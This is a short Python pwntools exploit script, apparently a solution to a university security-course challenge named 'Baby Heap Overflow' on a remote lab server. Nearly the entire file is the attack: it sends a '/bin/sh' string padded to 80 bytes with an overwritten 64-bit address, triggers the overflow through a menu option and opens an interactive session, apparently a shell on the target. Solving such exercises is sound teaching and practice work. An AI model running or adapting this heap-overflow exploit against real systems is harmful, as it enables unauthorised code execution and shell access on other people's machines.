from pwn import *

HOST = "cs412.epfl.ch"
PORT = 9035

conn = remote(HOST, PORT)

conn.recvuntil(b"Baby Heap Overflow")

conn.recvuntil(b"> ")

def send_cmd(cmd):
    """ 发送菜单命令 """
    conn.sendline(str(cmd).encode())

send_cmd(1)

# 构造 payload
payload = b"/bin/sh\x00"
payload = payload.ljust(80, b"A")
payload += p64(0x00403fc0)

conn.sendline(payload)

send_cmd(2)

conn.interactive()

conn.close()